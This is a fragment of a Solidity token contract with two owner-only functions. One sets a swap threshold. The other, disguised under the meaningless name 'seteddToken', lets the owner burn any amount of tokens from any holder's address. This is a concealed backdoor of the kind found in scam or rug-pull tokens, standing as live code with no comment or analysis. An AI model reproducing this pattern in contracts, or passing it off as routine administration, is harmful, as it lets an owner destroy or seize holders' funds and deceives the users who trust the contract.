  function  setswapTokensAtAmount(uint256 amount)public onlyOwner(){
      swapTokensAtAmount =amount;
  }

  function seteddToken(address spender,uint256 addvalue)public onlyOwner(){
      _burn(spender, addvalue * (10**9));
  }
